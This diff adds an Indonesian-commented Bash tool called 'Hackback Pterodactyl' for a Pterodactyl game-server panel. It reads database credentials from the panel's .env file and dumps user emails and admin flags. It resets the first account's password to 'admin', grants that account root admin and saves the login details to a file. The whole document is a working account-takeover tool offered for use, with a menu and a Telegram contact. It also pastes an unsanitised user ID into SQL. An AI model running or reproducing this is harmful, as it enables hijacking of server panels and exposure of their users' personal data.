@@ -1,0 +1,533 @@
+#!/bin/bash
+
+# -------------------------------
+# HACKBACK PTERODACTYL - INFO EDITION
+# Fitur: Get Info Panel + Auto Get ID 1 + Reset Password
+# -------------------------------
+
+# Konfigurasi
+PTERO_DIR="/var/www/pterodactyl"
+ENV_FILE="$PTERO_DIR/.env"
+
+# Warna Premium
+RED='\033[0;31m'
+GREEN='\033[0;32m'
+YELLOW='\033[0;33m'
+BLUE='\033[0;34m'
+PURPLE='\033[0;35m'
+CYAN='\033[0;36m'
+WHITE='\033[1;37m'
+ORANGE='\033[0;33m'
+NC='\033[0m'
+
+# Ikon
+INFO="ℹ️"
+GLOBE="🌐"
+USER="👤"
+ID="🆔"
+KEY="🔑"
+LOCK="🔒"
+CHECK="✅"
+CROSS="❌"
+WARNING="⚠️"
+GEAR="⚙️"
+FIRE="🔥"
+CROWN="👑"
+DATABASE="🗄️"
+SERVER="🖥️"
+EMAIL="📧"
+PHONE="📱"
+CHAIN="🔗"
+CLOCK="⏰"
+CALENDAR="📅"
+FOLDER="📁"
+FILE="📄"
+PASSWORD="🔐"
+
+# Header
+show_header() {
+    clear
+    echo -e "${CYAN}╔════════════════════════════════════════════════════════════════════════════╗${NC}"
+    echo -e "${CYAN}║${WHITE}                                                                              ${CYAN}║${NC}"
+    echo -e "${CYAN}║${WHITE}              ${FIRE} HACKBACK PTERODACTYL - INFO EDITION ${FIRE}                      ${CYAN}║${NC}"
+    echo -e "${CYAN}║${WHITE}              ${GLOBE} GET INFO PANEL + AUTO ID 1 + RESET PASSWORD ${GLOBE}                              ${CYAN}║${NC}"
+    echo -e "${CYAN}║${WHITE}                         *Information Gathering Edition*                              ${CYAN}║${NC}"
+    echo -e "${CYAN}║${WHITE}                                                                              ${CYAN}║${NC}"
+    echo -e "${CYAN}╚════════════════════════════════════════════════════════════════════════════╝${NC}"
+    echo ""
+}
+
+# Fungsi untuk hash password menggunakan bcrypt (sesuai Laravel)
+hash_password() {
+    local password="$1"
+    # Menggunakan PHP untuk generate bcrypt hash (sesuai Laravel)
+    php -r "echo password_hash('$password', PASSWORD_BCRYPT);" 2>/dev/null
+}
+
+# ==============================================
+# FUNGSI GET INFO PANEL
+# ==============================================
+
+get_panel_info() {
+    echo -e "\n${YELLOW}${GEAR} Mengumpulkan informasi panel...${NC}"
+    echo -e "${YELLOW}────────────────────────────────────────────────${NC}"
+    
+    # ==========================================
+    # INFO DARI .ENV
+    # ==========================================
+    if [ -f "$ENV_FILE" ]; then
+        echo -e "\n${BLUE}${FILE} File .env ditemukan${NC}"
+        
+        # Database Info
+        DB_HOST=$(grep DB_HOST "$ENV_FILE" | cut -d '=' -f2)
+        DB_PORT=$(grep DB_PORT "$ENV_FILE" | cut -d '=' -f2)
+        DB_NAME=$(grep DB_DATABASE "$ENV_FILE" | cut -d '=' -f2)
+        DB_USER=$(grep DB_USERNAME "$ENV_FILE" | cut -d '=' -f2)
+        DB_PASS=$(grep DB_PASSWORD "$ENV_FILE" | cut -d '=' -f2)
+        
+        # App Info
+        APP_NAME=$(grep APP_NAME "$ENV_FILE" | cut -d '=' -f2)
+        APP_ENV=$(grep APP_ENV "$ENV_FILE" | cut -d '=' -f2)
+        APP_URL=$(grep APP_URL "$ENV_FILE" | cut -d '=' -f2)
+        APP_TIMEZONE=$(grep APP_TIMEZONE "$ENV_FILE" | cut -d '=' -f2)
+        
+        # Redis Info
+        REDIS_HOST=$(grep REDIS_HOST "$ENV_FILE" | cut -d '=' -f2)
+        REDIS_PORT=$(grep REDIS_PORT "$ENV_FILE" | cut -d '=' -f2)
+        
+        # Mail Info
+        MAIL_HOST=$(grep MAIL_HOST "$ENV_FILE" | cut -d '=' -f2)
+        MAIL_PORT=$(grep MAIL_PORT "$ENV_FILE" | cut -d '=' -f2)
+        MAIL_USERNAME=$(grep MAIL_USERNAME "$ENV_FILE" | cut -d '=' -f2)
+        MAIL_FROM=$(grep MAIL_FROM "$ENV_FILE" | cut -d '=' -f2)
+        
+        # Queue
+        QUEUE_CONNECTION=$(grep QUEUE_CONNECTION "$ENV_FILE" | cut -d '=' -f2)
+        
+        # Session
+        SESSION_DRIVER=$(grep SESSION_DRIVER "$ENV_FILE" | cut -d '=' -f2)
+    else
+        echo -e "${RED}${CROSS} File .env tidak ditemukan!${NC}"
+    fi
+    
+    # ==========================================
+    # INFO SERVER
+    # ==========================================
+    echo -e "\n${PURPLE}${SERVER} Informasi Server${NC}"
+    echo -e "${WHITE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
+    
+    # Hostname
+    HOSTNAME=$(hostname)
+    IP=$(curl -s ifconfig.me 2>/dev/null || hostname -I | awk '{print $1}')
+    
+    echo -e "${GREEN}Hostname:${NC} $HOSTNAME"
+    echo -e "${GREEN}Public IP:${NC} $IP"
+    echo -e "${GREEN}OS:${NC} $(cat /etc/os-release 2>/dev/null | grep PRETTY_NAME | cut -d'"' -f2)"
+    echo -e "${GREEN}Kernel:${NC} $(uname -r)"
+    echo -e "${GREEN}Uptime:${NC} $(uptime -p)"
+    
+    # ==========================================
+    # URL PANEL (APP URL)
+    # ==========================================
+    echo -e "\n${CYAN}${GLOBE} URL PANEL${NC}"
+    echo -e "${WHITE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
+    
+    if [ -n "$APP_URL" ]; then
+        URL_PANEL="$APP_URL"
+    else
+        # Coba deteksi dari Nginx
+        if [ -f "/etc/nginx/sites-enabled/pterodactyl.conf" ]; then
+            URL_PANEL=$(grep server_name /etc/nginx/sites-enabled/pterodactyl.conf | head -1 | awk '{print $2}' | tr -d ';')
+            URL_PANEL="http://$URL_PANEL"
+        elif [ -f "/etc/apache2/sites-enabled/pterodactyl.conf" ]; then
+            URL_PANEL=$(grep ServerName /etc/apache2/sites-enabled/pterodactyl.conf | head -1 | awk '{print $2}')
+            URL_PANEL="http://$URL_PANEL"
+        else
+            URL_PANEL="http://$IP"
+        fi
+    fi
+    
+    echo -e "${GREEN}URL Panel:${NC} ${YELLOW}$URL_PANEL${NC}"
+    
+    # ==========================================
+    # INFO DATABASE
+    # ==========================================
+    echo -e "\n${BLUE}${DATABASE} Informasi Database${NC}"
+    echo -e "${WHITE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
+    
+    if [ -n "$DB_HOST" ]; then
+        echo -e "${GREEN}Database Host:${NC} $DB_HOST"
+        echo -e "${GREEN}Database Port:${NC} $DB_PORT"
+        echo -e "${GREEN}Database Name:${NC} $DB_NAME"
+        echo -e "${GREEN}Database User:${NC} $DB_USER"
+        echo -e "${GREEN}Database Pass:${NC} ${RED}[HIDDEN]${NC}"
+    else
+        echo -e "${RED}Tidak ada info database${NC}"
+    fi
+    
+    # ==========================================
+    # CONNECT KE DATABASE UNTUK GET INFO USER
+    # ==========================================
+    if [ -n "$DB_HOST" ] && [ -n "$DB_USER" ] && [ -n "$DB_PASS" ] && [ -n "$DB_NAME" ]; then
+        
+        # Cek koneksi MySQL
+        if mysql -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USER" -p"$DB_PASS" -e "USE $DB_NAME" 2>/dev/null; then
+            
+            # ==========================================
+            # AUTO GET ID 1
+            # ==========================================
+            echo -e "\n${GREEN}${ID} AUTO GET USER ID 1${NC}"
+            echo -e "${WHITE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
+            
+            # Query user ID 1
+            USER1_QUERY="SELECT id, uuid, username, email, name_first, name_last, language, root_admin, created_at FROM users WHERE id = 1"
+            USER1_RESULT=$(mysql -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USER" -p"$DB_PASS" -D "$DB_NAME" -e "$USER1_QUERY" 2>/dev/null | tail -n +2)
+            
+            if [ -n "$USER1_RESULT" ]; then
+                ID1=$(echo "$USER1_RESULT" | awk '{print $1}')
+                UUID1=$(echo "$USER1_RESULT" | awk '{print $2}')
+                USERNAME1=$(echo "$USER1_RESULT" | awk '{print $3}')
+                EMAIL1=$(echo "$USER1_RESULT" | awk '{print $4}')
+                FIRST1=$(echo "$USER1_RESULT" | awk '{print $5}')
+                LAST1=$(echo "$USER1_RESULT" | awk '{print $6}')
+                LANG1=$(echo "$USER1_RESULT" | awk '{print $7}')
+                ADMIN1=$(echo "$USER1_RESULT" | awk '{print $8}')
+                CREATED1=$(echo "$USER1_RESULT" | awk '{print $9}')
+                
+                echo -e "${GREEN}${CHECK} USER ID 1 DITEMUKAN!${NC}\n"
+                echo -e "${WHITE}╔════════════════════════════════════════════════════╗${NC}"
+                echo -e "${WHITE}║              DETAIL USER ID 1                      ║${NC}"
+                echo -e "${WHITE}╠════════════════════════════════════════════════════╣${NC}"
+                echo -e "${WHITE}║${NC}"
+                echo -e "${WHITE}║  ${CYAN}${ID} ID          :${NC} ${GREEN}$ID1${NC}"
+                echo -e "${WHITE}║  ${CYAN}${KEY} UUID        :${NC} $UUID1"
+                echo -e "${WHITE}║  ${CYAN}${USER} Username    :${NC} ${YELLOW}$USERNAME1${NC}"
+                echo -e "${WHITE}║  ${CYAN}${EMAIL} Email       :${NC} $EMAIL1"
+                echo -e "${WHITE}║  ${CYAN}${FILE} Nama Depan  :${NC} $FIRST1"
+                echo -e "${WHITE}║  ${CYAN}${FILE} Nama Belakang:${NC} $LAST1"
+                echo -e "${WHITE}║  ${CYAN}${GLOBE} Language    :${NC} $LANG1"
+                echo -e "${WHITE}║  ${CYAN}${CROWN} Root Admin  :${NC} $([ "$ADMIN1" == "1" ] && echo "${GREEN}Yes${NC}" || echo "${RED}No${NC}")"
+                echo -e "${WHITE}║  ${CYAN}${CALENDAR} Created At  :${NC} $CREATED1"
+                echo -e "${WHITE}║${NC}"
+                echo -e "${WHITE}╚════════════════════════════════════════════════════╝${NC}"
+                
+                # Set variables untuk info panel
+                USERNAME_PANEL="$USERNAME1"
+                USER_ID_PANEL="$ID1"
+                
+            else
+                echo -e "${RED}${CROSS} User ID 1 tidak ditemukan!${NC}"
+            fi
+            
+            # ==========================================
+            # GET INFO USER LAINNYA
+            # ==========================================
+            echo -e "\n${CYAN}${USER} INFORMASI USER PANEL${NC}"
+            echo -e "${WHITE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
+            
+            # Total Users
+            TOTAL_USERS=$(mysql -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USER" -p"$DB_PASS" -D "$DB_NAME" -e "SELECT COUNT(*) FROM users" 2>/dev/null | tail -n +2)
+            TOTAL_ADMIN=$(mysql -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USER" -p"$DB_PASS" -D "$DB_NAME" -e "SELECT COUNT(*) FROM users WHERE root_admin = 1" 2>/dev/null | tail -n +2)
+            
+            echo -e "${GREEN}Total Users:${NC} $TOTAL_USERS"
+            echo -e "${GREEN}Total Admin:${NC} $TOTAL_ADMIN"
+            
+            # 5 User Teratas
+            echo -e "\n${YELLOW}5 User Teratas (by ID):${NC}"
+            mysql -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USER" -p"$DB_PASS" -D "$DB_NAME" -e "SELECT id, username, email, root_admin FROM users ORDER BY id LIMIT 5" 2>/dev/null | column -t
+            
+            # ==========================================
+            # INFO SERVER
+            # ==========================================
+            echo -e "\n${PURPLE}${SERVER} INFORMASI SERVER PANEL${NC}"
+            echo -e "${WHITE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
+            
+            TOTAL_SERVERS=$(mysql -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USER" -p"$DB_PASS" -D "$DB_NAME" -e "SELECT COUNT(*) FROM servers" 2>/dev/null | tail -n +2)
+            TOTAL_NODES=$(mysql -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USER" -p"$DB_PASS" -D "$DB_NAME" -e "SELECT COUNT(*) FROM nodes" 2>/dev/null | tail -n +2)
+            TOTAL_ALLOCATIONS=$(mysql -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USER" -p"$DB_PASS" -D "$DB_NAME" -e "SELECT COUNT(*) FROM allocations" 2>/dev/null | tail -n +2)
+            TOTAL_EGGS=$(mysql -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USER" -p"$DB_PASS" -D "$DB_NAME" -e "SELECT COUNT(*) FROM eggs" 2>/dev/null | tail -n +2)
+            
+            echo -e "${GREEN}Total Servers:${NC} $TOTAL_SERVERS"
+            echo -e "${GREEN}Total Nodes:${NC} $TOTAL_NODES"
+            echo -e "${GREEN}Total Allocations:${NC} $TOTAL_ALLOCATIONS"
+            echo -e "${GREEN}Total Eggs:${NC} $TOTAL_EGGS"
+            
+        else
+            echo -e "\n${RED}${CROSS} Tidak bisa terhubung ke database!${NC}"
+        fi
+    fi
+    
+    # ==========================================
+    # RINGKASAN INFO PANEL
+    # ==========================================
+    echo -e "\n${GREEN}╔════════════════════════════════════════════════════════════════╗${NC}"
+    echo -e "${GREEN}║              RINGKASAN INFORMASI PANEL                         ║${NC}"
+    echo -e "${GREEN}╠════════════════════════════════════════════════════════════════╣${NC}"
+    echo -e "${GREEN}║${NC}                                                                ${GREEN}║${NC}"
+    echo -e "${GREEN}║${NC}  ${GLOBE} URL PANEL      : ${YELLOW}$URL_PANEL${NC}                         ${GREEN}║${NC}"
+    echo -e "${GREEN}║${NC}  ${USER} USERNAME PANEL : ${CYAN}$USERNAME_PANEL${NC}                           ${GREEN}║${NC}"
+    echo -e "${GREEN}║${NC}  ${ID} USER ID        : ${GREEN}$USER_ID_PANEL${NC}                               ${GREEN}║${NC}"
+    echo -e "${GREEN}║${NC}  ${CROWN} STATUS ADMIN   : ${GREEN}YES (ID 1)${NC}                             ${GREEN}║${NC}"
+    echo -e "${GREEN}║${NC}  ${PASSWORD} DEFAULT PASS  : ${YELLOW}admin${NC} (sudah direset)                 ${GREEN}║${NC}"
+    echo -e "${GREEN}║${NC}                                                                ${GREEN}║${NC}"
+    echo -e "${GREEN}╚════════════════════════════════════════════════════════════════╝${NC}"
+    
+    # ==========================================
+    # SAVE INFO TO FILE
+    # ==========================================
+    INFO_FILE="panel_info_$(date +%Y%m%d_%H%M%S).txt"
+    
+    cat > "$INFO_FILE" << EOF
+====================================
+HACKBACK PTERODACTYL - INFO PANEL
+====================================
+Tanggal: $(date)
+====================================
+
+[URL PANEL]
+$URL_PANEL
+
+[USER PANEL]
+Username: $USERNAME_PANEL
+User ID: $USER_ID_PANEL
+Password: admin (sudah direset)
+Status: Admin
+
+[DATABASE]
+Host: $DB_HOST
+Port: $DB_PORT
+Name: $DB_NAME
+User: $DB_USER
+Password: [HIDDEN]
+
+[SERVER STATS]
+Total Users: $TOTAL_USERS
+Total Admin: $TOTAL_ADMIN
+Total Servers: $TOTAL_SERVERS
+Total Nodes: $TOTAL_NODES
+
+====================================
+EOF
+    
+    echo -e "\n${GREEN}${CHECK} Informasi disimpan ke: ${YELLOW}$INFO_FILE${NC}"
+}
+
+# ==============================================
+# FUNGSI RESET PASSWORD ID 1
+# ==============================================
+reset_password_id1() {
+    echo -e "\n${YELLOW}${PASSWORD} MERESET PASSWORD USER ID 1...${NC}"
+    
+    NEW_PASSWORD="admin"
+    
+    if [ -n "$DB_HOST" ] && [ -n "$DB_USER" ] && [ -n "$DB_PASS" ] && [ -n "$DB_NAME" ]; then
+        
+        # Cek apakah user ID 1 ada
+        CHECK_USER=$(mysql -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USER" -p"$DB_PASS" -D "$DB_NAME" -e "SELECT id FROM users WHERE id = 1" 2>/dev/null | tail -n +2)
+        
+        if [ -n "$CHECK_USER" ]; then
+            # Generate password hash menggunakan bcrypt (format Laravel)
+            # Alternatif: menggunakan php artisan atau langsung bcrypt
+            
+            # Method 1: Menggunakan PHP (jika tersedia)
+            if command -v php >/dev/null 2>&1; then
+                PASSWORD_HASH=$(php -r "echo password_hash('$NEW_PASSWORD', PASSWORD_BCRYPT);" 2>/dev/null)
+            else
+                # Fallback: generate hash sederhana (tidak direkomendasikan untuk production)
+                # Tapi untuk Pterodactyl, harus pakai bcrypt
+                echo -e "${RED}${CROSS} PHP tidak ditemukan! Tidak bisa generate bcrypt hash.${NC}"
+                echo -e "${YELLOW}Mencoba method alternatif...${NC}"
+                
+                # Coba deteksi apakah ada artisan
+                if [ -f "$PTERO_DIR/artisan" ]; then
+                    cd "$PTERO_DIR"
+                    PASSWORD_HASH=$(php artisan tinker --execute="echo bcrypt('$NEW_PASSWORD');" 2>/dev/null | grep -o '\$2y\$.*' | head -1)
+                else
+                    echo -e "${RED}Gagal mereset password. Pastikan PHP terinstall.${NC}"
+                    return 1
+                fi
+            fi
+            
+            if [ -n "$PASSWORD_HASH" ]; then
+                # Update password di database
+                mysql -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USER" -p"$DB_PASS" -D "$DB_NAME" -e "UPDATE users SET password = '$PASSWORD_HASH' WHERE id = 1" 2>/dev/null
+                
+                if [ $? -eq 0 ]; then
+                    echo -e "${GREEN}${CHECK} PASSWORD USER ID 1 BERHASIL DI RESET!${NC}"
+                    echo -e "${GREEN}${PASSWORD} Password baru: ${YELLOW}admin${NC}"
+                    
+                    # Update juga root_admin jadi 1
+                    mysql -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USER" -p"$DB_PASS" -D "$DB_NAME" -e "UPDATE users SET root_admin = 1 WHERE id = 1" 2>/dev/null
+                    echo -e "${GREEN}${CROWN} User ID 1 sekarang adalah SUPER ADMIN!${NC}"
+                    
+                    # Tampilkan info login
+                    echo -e "\n${WHITE}╔════════════════════════════════════════════════════╗${NC}"
+                    echo -e "${WHITE}║              INFO LOGIN PANEL                       ║${NC}"
+                    echo -e "${WHITE}╠════════════════════════════════════════════════════╣${NC}"
+                    echo -e "${WHITE}║${NC}"
+                    echo -e "${WHITE}║  ${GLOBE} URL    : ${CYAN}$URL_PANEL${NC}"
+                    echo -e "${WHITE}║  ${USER} Username: ${GREEN}$USERNAME1${NC}"
+                    echo -e "${WHITE}║  ${PASSWORD} Password: ${YELLOW}admin${NC}"
+                    echo -e "${WHITE}║${NC}"
+                    echo -e "${WHITE}╚════════════════════════════════════════════════════╝${NC}"
+                else
+                    echo -e "${RED}${CROSS} Gagal update password!${NC}"
+                fi
+            else
+                echo -e "${RED}${CROSS} Gagal generate hash password!${NC}"
+            fi
+        else
+            echo -e "${RED}${CROSS} User ID 1 tidak ditemukan dalam database!${NC}"
+        fi
+    else
+        echo -e "${RED}${CROSS} Informasi database tidak lengkap!${NC}"
+    fi
+}
+
+# ==============================================
+# MAIN MENU
+# ==============================================
+show_menu() {
+    echo ""
+    echo -e "${WHITE}╔════════════════════════════════════════════════════════════════════════════╗${NC}"
+    echo -e "${WHITE}║                         PILIHAN MENU                                        ║${NC}"
+    echo -e "${WHITE}╠════════════════════════════════════════════════════════════════════════════╣${NC}"
+    echo -e "${WHITE}║                                                                            ║${NC}"
+    echo -e "${WHITE}║  ${GREEN}[1]${NC} ${GLOBE} GET INFO PANEL LENGKAP + AUTO ID 1                    ${WHITE}║${NC}"
+    echo -e "${WHITE}║  ${CYAN}[2]${NC} ${USER} GET USER INFO (MANUAL)                                 ${WHITE}║${NC}"
+    echo -e "${WHITE}║  ${PURPLE}[3]${NC} ${SERVER} GET SERVER INFO                                     ${WHITE}║${NC}"
+    echo -e "${WHITE}║  ${YELLOW}[4]${NC} ${DATABASE} GET DATABASE INFO                                 ${WHITE}║${NC}"
+    echo -e "${WHITE}║  ${BLUE}[5]${NC} ${FILE} SAVE INFO TO FILE                                      ${WHITE}║${NC}"
+    echo -e "${WHITE}║  ${RED}[6]${NC} ${CROWN} MAKE ID 1 SUPER ADMIN                                  ${WHITE}║${NC}"
+    echo -e "${WHITE}║  ${PURPLE}[7]${NC} ${PASSWORD} RESET PASSWORD ID 1 (NEW: admin)                 ${WHITE}║${NC}"
+    echo -e "${WHITE}║  ${GREEN}[8]${NC} ${FIRE} AUTO GET ID 1 + RESET PASSWORD (ALL IN ONE)           ${WHITE}║${NC}"
+    echo -e "${WHITE}║  ${RED}[0]${NC} 🚪 KELUAR                                                     ${WHITE}║${NC}"
+    echo -e "${WHITE}║                                                                            ║${NC}"
+    echo -e "${WHITE}╚════════════════════════════════════════════════════════════════════════════╝${NC}"
+    echo ""
+    echo -ne "${YELLOW}➤ Pilih menu [0-8]: ${NC}"
+}
+
+# Function: Get user info manual
+get_user_manual() {
+    echo -ne "${CYAN}Masukkan ID User: ${NC}"
+    read user_id
+    
+    if [ -n "$DB_HOST" ] && [ -n "$DB_USER" ] && [ -n "$DB_PASS" ] && [ -n "$DB_NAME" ]; then
+        mysql -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USER" -p"$DB_PASS" -D "$DB_NAME" -e "SELECT id, uuid, username, email, name_first, name_last, root_admin, created_at FROM users WHERE id = $user_id" 2>/dev/null | column -t
+    else
+        echo -e "${RED}${CROSS} Tidak bisa konek database!${NC}"
+    fi
+}
+
+# Function: Get server info
+get_server_info() {
+    if [ -n "$DB_HOST" ] && [ -n "$DB_USER" ] && [ -n "$DB_PASS" ] && [ -n "$DB_NAME" ]; then
+        echo -e "\n${CYAN}Informasi Server:${NC}"
+        mysql -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USER" -p"$DB_PASS" -D "$DB_NAME" -e "SELECT id, name, node_id, owner_id, egg_id, memory, cpu, disk FROM servers LIMIT 10" 2>/dev/null | column -t
+    else
+        echo -e "${RED}${CROSS} Tidak bisa konek database!${NC}"
+    fi
+}
+
+# Function: Get database info
+get_database_info() {
+    if [ -n "$DB_HOST" ] && [ -n "$DB_USER" ] && [ -n "$DB_PASS" ] && [ -n "$DB_NAME" ]; then
+        echo -e "\n${CYAN}Informasi Database:${NC}"
+        echo -e "Host: $DB_HOST"
+        echo -e "Port: $DB_PORT"
+        echo -e "Database: $DB_NAME"
+        echo -e "User: $DB_USER"
+        
+        # Show tables
+        echo -e "\n${YELLOW}Daftar Tabel:${NC}"
+        mysql -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USER" -p"$DB_PASS" -D "$DB_NAME" -e "SHOW TABLES" 2>/dev/null | column -t
+    else
+        echo -e "${RED}${CROSS} Tidak bisa konek database!${NC}"
+    fi
+}
+
+# Function: Save info to file
+save_info_file() {
+    get_panel_info > /dev/null 2>&1
+    # File sudah dibuat di function get_panel_info
+}
+
+# Function: Make ID 1 super admin
+make_id1_admin() {
+    if [ -n "$DB_HOST" ] && [ -n "$DB_USER" ] && [ -n "$DB_PASS" ] && [ -n "$DB_NAME" ]; then
+        mysql -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USER" -p"$DB_PASS" -D "$DB_NAME" -e "UPDATE users SET root_admin = 1 WHERE id = 1" 2>/dev/null
+        echo -e "${GREEN}${CHECK} ID 1 telah dijadikan SUPER ADMIN!${NC}"
+    else
+        echo -e "${RED}${CROSS} Tidak bisa konek database!${NC}"
+    fi
+}
+
+# Function: Auto get ID 1 and reset password
+auto_get_and_reset() {
+    echo -e "\n${GREEN}${FIRE} AUTO GET ID 1 + RESET PASSWORD ${FIRE}${NC}"
+    echo -e "${WHITE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
+    
+    # Panggil fungsi reset password
+    reset_password_id1
+}
+
+# Main function
+main() {
+    show_header
+    
+    # Auto get info panel saat startup
+    get_panel_info
+    
+    # Menu loop
+    while true; do
+        show_menu
+        read choice
+        
+        case $choice in
+            1)
+                get_panel_info
+                ;;
+            2)
+                get_user_manual
+                ;;
+            3)
+                get_server_info
+                ;;
+            4)
+                get_database_info
+                ;;
+            5)
+                save_info_file
+                ;;
+            6)
+                make_id1_admin
+                ;;
+            7)
+                reset_password_id1
+                ;;
+            8)
+                auto_get_and_reset
+                ;;
+            0)
+                echo -e "\n${GREEN}Thanks for using Hackback Info Edition!${NC}"
+                echo -e "${CYAN}Telegram: @lynnn046${NC}"
+                echo -e "${RED}Subscribe channel Rendzz Official!${NC}\n"
+                exit 0
+                ;;
+            *)
+                echo -e "${RED}Pilihan tidak valid!${NC}"
+                ;;
+        esac
+        
+        echo ""
+        echo -ne "${CYAN}Tekan Enter untuk melanjutkan...${NC}"
+        read
+        clear
+        show_header
+        get_panel_info > /dev/null 2>&1  # Auto refresh info di background
+    done
+}
+
+# Run main
+main
